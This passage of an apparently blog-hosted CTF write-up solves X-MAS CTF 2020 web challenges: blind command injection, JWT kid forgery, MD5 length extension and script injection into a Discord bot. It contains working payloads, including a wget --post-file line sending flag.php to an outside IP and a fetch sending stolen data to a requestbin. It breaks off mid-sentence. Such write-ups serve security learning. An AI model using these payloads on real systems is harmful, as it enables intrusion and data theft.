<span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The getFlag function receives the $flag value, connects it after the wget command, and sets the output of the exec function as an array.</p><p>Here, if the command executed well, it prints Maybe, and if not, prints Nope.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>In the above part, you can see that the flag value is received, the input value is verified using the checkFlag function, and the getFlag function is executed if the filtering does not occur.</p><p>In this problem, the command execution value is not output, so the input value must be retrieved to a private server.</p><p>So, first, letâ€™s check if there is a way to get the php file using the wget command.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/2.png?raw=true"><br>When I searched Google for Blind Command Injection, I could see that using the â€“post-file option of the wget command as above, the file was read and sent as the POST body value.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">  extended: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;X-MAS!!!!&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body);</span><br><span class="line">res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port &#x27;</span> + PORT + <span class="string">&#x27;...&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>In order to receive the flag, I built a simple server using Node.js to output the POST body value as above.</p><p><code>Payload : $&#123;IFS&#125;-$&#123;IFS&#125;--post-file$&#123;IFS&#125;flag.php$&#123;IFS&#125;141.164.55.161</code></p><p>So, I passed the payload above as the flag value.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/3.png?raw=true"><br>When I checked the server log, I could see the flag.php file came.</p><blockquote><p>FLAG : X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}</p></blockquote><hr><h2 id="Web-X-MAS-Chan-470-pts"><a href="#Web-X-MAS-Chan-470-pts" class="headerlink" title=" (Web) X-MAS Chan [470 pts]"></a><span style="color:#21C587"></span> (Web) X-MAS Chan [470 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/1.png?raw=true"><br>This time, we will solve the problem called <code>X-MAS Chan</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/2.png?raw=true"><br>If you come into trouble, you can see there are links and rules that can get you into the board.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/3.png?raw=true"><br>When I came to the board, I can see that the file upload function exists as above. </p><p>And as a result of checking, it was found that only photos such as jpg, png, and gif can be uploaded.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/4.png?raw=true"><br>Also, if you check the source code, you can see that there is getbanner.php, and the logic is logic to get a picture using jwt. <code>You can see that jwt is set as a value in a cookie called banner.</code><br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/5.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;&#x2F;tmp&#x2F;jwt.key&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When the jwt is decoded, you can see that the header part uses the <code>HS256</code> algorithm as above and the kid value is using <code>/tmp/jwt.key</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;banner&quot;: &quot;banner&#x2F;11.gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As the data above, you can see that you are receiving a 11.gif photo as the value of the banner. So, if you give <code>flag.php</code> as the <code>value of banner</code>, it will read and return <code>flag.php</code>, not the picture. </p><p>So how do I <code>sign</code> JWT when I donâ€™t know the <code>secret key</code>? </p><p>You can think of the kid value in the header as a pointer to the secret key. In the above jwt, since kid points to <code>/tmp/jwt.key</code>, the value contained in jwt.key can be used as the secret key. </p><p>So, upload a photo using the file upload function, and when the kid points to the photo, you can sign using the binary value of the photo.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/6.png?raw=true"><br>I will make a gif file as above and use it.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/7.png?raw=true"><br>So, when I uploaded the file, you can see the file was created with the path <code>/b/src/1608071199792.gif</code>. Now, if you give the above path as the <code>kid</code> value in the jwt header, you can use the <code>binary value of the above file</code> as the <code>secret key.</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwt.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    key = fp.read()</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;<span class="string">&#x27;banner&#x27;</span>: <span class="string">&#x27;flag.php&#x27;</span>&#125;, key, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=&#123;<span class="string">&#x27;kid&#x27;</span>: <span class="string">&#x27;/var/www/html/b/src/1608071199792.gif&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure><p>I wrote jwt Signing code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/8.png?raw=true"><br>If you run the code, you can see jwt appear as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/9.png?raw=true"><br>When I decode jwt and check it, I can see that the value is well entered.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/10.png?raw=true"><br>So when I send a request to getbanner.php using the above jwt, you can see that flag.php is displayed, not the picture.</p><blockquote><p>FLAG : X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}</p></blockquote><hr><h2 id="Web-cat-clicker-474-pts"><a href="#Web-cat-clicker-474-pts" class="headerlink" title=" (Web) cat_clicker [474 pts]"></a><span style="color:#21C587"></span> (Web) cat_clicker [474 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/1.png?raw=true"><br>This time, we will solve the problem called <code>Cat Clicker</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/2.png?raw=true"><br>When it comes to problems, there is logic to buy flags using the number of cats. The fake flag seems to be available for purchase if you have one cat and the real flag is 13 cats.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/3.png?raw=true"><br>You can increase the number of cats by clicking on the face, but it seems like 12 is the maximum.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state : 12 | 0</span><br><span class="line">hash : cf13ab76afb625f7f7d6c539c2cb3c84</span><br><span class="line"></span><br><span class="line">state : 12 | 1</span><br><span class="line">hash : e71f77e8f7c2c2957292f4a0e1d79d9d</span><br><span class="line"></span><br><span class="line">(Skip)</span><br><span class="line"></span><br><span class="line">state : 12 | 12</span><br><span class="line">hash : 9579729592f72a075bb61f63b8ea238e</span><br></pre></td></tr></table></figure><p>As above, the number of cats is managed by the hash value, and looking at the hash, it seems to be an md5 hash.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/4.png?raw=true"><br>And since this web service has a .git directory, you can pull out all the .git trees.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/5.png?raw=true"><br>I downloaded all the .git trees using gitdumper.sh, and you can lick the source code using the <code>git cat-file -p</code> command.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashFor</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$secret</span> = getenv(<span class="string">&quot;SECRET_THINGY&quot;</span>); <span class="comment">// 64 random characters - impossible to guess</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;<span class="subst">$secret</span> | <span class="subst">$state</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> md5(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyState</span>(<span class="params"><span class="variable">$state</span>, <span class="variable">$hash</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$hash</span> === hashFor(<span class="variable">$state</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getParentsLimit</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(reset(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The above code is the source code of helper.php. If you look at the hashFor function, you are using <code>salt</code>. As such, the hash value cannot be predicted, but you can bypass it using a <code>hash length extension attack</code>. </p><p>Kindly the length of the salt is <code>64</code>, as you can see it shows in the tin. If you donâ€™t know the length of the salt, you need to estimate the length using <code>brute force</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And if you look at the getCatsNo function, you can see that the last value of the array is used as the number of cats by using the end function. </p><p>Therefore, when it becomes â€œ<code>12 | 1 | Null Byte | 1000 |</code>â€œ, <code>1000</code> is used as the number of cats. If there is no logic to fetch only the last value of the array, it wonâ€™t work.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/6.png?raw=true"><br>So, since I know the salt length, I made a payload using <code>hashpump</code>. (<code>URL encoding</code>)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&quot;node-fetch&quot;</span>);</span><br><span class="line">fetch(<span class="string">&#x27;http://challs.xmas.htsp.ro:3003/api/buy.php&#x27;</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="string">&#x27;item_id=2&amp;state=12%20%7C%201%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%02%00%00%00%00%00%00%20%7C%201000&amp;hash=f48ccd5768b829f8856ae186eb4bf4a4&#x27;</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>As above, I wrote the exploit code using JavaScript.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/7.png?raw=true"><br>Finally, return the exploit code to see the successful purchase of the flag.</p><blockquote><p>FLAG : X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}</p></blockquote><hr><h2 id="Web-Comfort-Bot-432-pts"><a href="#Web-Comfort-Bot-432-pts" class="headerlink" title=" (Web) Comfort Bot [432 pts]"></a><span style="color:#21C587"></span> (Web) Comfort Bot [432 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Comforn%20Bot/1.png?raw=true"><br>This time, we will solve one of the web problems from X-MAS CTF 2020 called Comfort Bot. </p><p>The peculiarity of the Comfort Bot problem was that it did not have a web server and was solved using the X-MAS bot within Discord. And it provides the source code, so letâ€™s check the source code first.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bot.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (message.content.startswith (<span class="string">&quot;!&quot;</span>)):</span><br><span class="line">spell = <span class="literal">True</span></span><br><span class="line">response = <span class="keyword">await</span> engine.getCleverResponse (authorID, message.content[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p>The code above is the part that is executed when the value input from the X-MAS Discord Bot starts with an exclamation mark.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># engine.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, message</span>):</span></span><br><span class="line"><span class="keyword">if</span> (authorID == <span class="number">0</span>):</span><br><span class="line"><span class="keyword">return</span> random.choice([<span class="string">&quot;Oh, I quite certainly agree.&quot;</span>, <span class="string">&quot;There, there, it&#x27;s alright.&quot;</span>, <span class="string">&quot;Oh!&quot;</span>, <span class="string">&quot;Fascinating!&quot;</span>, <span class="string">&quot;Exquisite reply!&quot;</span>, <span class="string">&quot;Running program: COMFORT.&quot;</span>, <span class="string">&quot;Understandable.&quot;</span>, <span class="string">&quot;Hmm.&quot;</span>, <span class="string">&quot;I see.&quot;</span>, <span class="string">&quot;Well, if you really think that...&quot;</span>, <span class="string">&quot;What are you doing?&quot;</span>, <span class="string">&quot;What are you up to?&quot;</span>, <span class="string">&quot;What&#x27;s that?&quot;</span>, <span class="string">&quot;[Nodding]&quot;</span>, <span class="string">&quot;[Nodding and stroking chin saying mhmm]&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">await</span> parseUsers (cleverDriver.getCleverResponse (authorID, message))</span><br></pre></td></tr></table></figure><p>The code above is the getCleverResponse function in engile.py. In the code, you can see that if authorID is <code>0</code>, a random string in the array is printed, and if authorID is <code>not 0</code>, cleverDriver.getCleverResponse function is executed.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driver.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, txt</span>):</span></span><br><span class="line"><span class="keyword">global</span> driver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.open(&#x27;http://localhost/&#x27;,&#x27;_blank&#x27;);&quot;</span>)</span><br><span class="line">windows[authorID] = driver.window_handles[-<span class="number">1</span>]</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br><span class="line"><span class="keyword">while</span> (driver.execute_script (<span class="string">&quot;return cleverbot.aistate&quot;</span>) != <span class="number">0</span>):</span><br><span class="line"><span class="keyword">await</span> asyncio.sleep (<span class="number">0.4</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">reply = driver.execute_script (<span class="string">&quot;return cleverbot.reply&quot;</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.close()&quot;</span>)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> reply</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">CreateCleverDriver ()</span><br></pre></td></tr></table></figure><p>The code above is in the getCleverResmpose function in driver.py!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br></pre></td></tr></table></figure><p>If you look in the middle, you can see the code above. The <code>txt</code> value is put in the script variable without any verification, and the script is executed using the <code>execute_script</code> function. </p><p>You can trigger XSS in the logic right above.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script = &quot;cleverbot.sendAI(&#x27;!asdf&#x27;);fetch(&#x27;/flag&#x27;).then(x=&gt;x.text()).then(x=&gt;fetch(&quot;URL/?f=&quot; + x));(&#x27;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>If you manipulate the code and make it as above, the fetch function runs well and you can steal the flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!asdf&#39;);fetch(&#39;&#x2F;flag&#39;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;https:&#x2F;&#x2F;384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net&#x2F;?f&#x3D; &quot; +x));(&#39;</span><br></pre></td></tr></table></figure><p>So I wrote the payload as above and sent it to the X-MAS Discord Bot.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Comforn%20Bot/2.png?raw=true"><br>Finally, when I checked the requestbin, I could see the flag came.</p><blockquote><p>FLAG : X-MAS{0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae}</p></blockquote><hr><h2 id="Web-How-Brutus-stole-492-pts"><a href="#Web-How-Brutus-stole-492-pts" class="headerlink" title=" (Web) How Brutus stole [492 pts]"></a><span style="color:#21C587"></span> (Web) How Brutus stole [492 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/1.png?raw=true"><br>This time, we will solve the problem of How Brutus stole Christmas among the web problems raised by the X-MAS CTF. This problem is a problem that I tried until the last time because I didnâ€™t have enough time to solve it. </p><p>The peculiar thing about this problem is that one CTF site is given as a problem, and the problem is that the CTF site is hacked using the problem in the given CTF site.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pageContent</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file_name</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$newContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name=<span class="string">&quot;data/content.txt&quot;</span>; </span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$file</span>;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;newContent;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setContent</span>(<span class="params"><span class="variable">$newContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$newContent</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">    fclose(<span class="variable">$fd</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFooter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newFooter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$newFooter</span>=unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&quot;newFooter&quot;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;&#x27;</span>.<span class="variable">$newFooter</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;PWNgyan 2020!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> pageContent;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$page</span>;</span><br><span class="line">setFooter();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Iâ€™m going to hack the site using problem 1 on the CTF site. If you come into question 1, you can find the code above.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">  fclose(<span class="variable">$fd</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Looking at the code, you can see that when the destructor runs, it creates a file. After seeing this, I thought I should upload a web shell using PHP Object 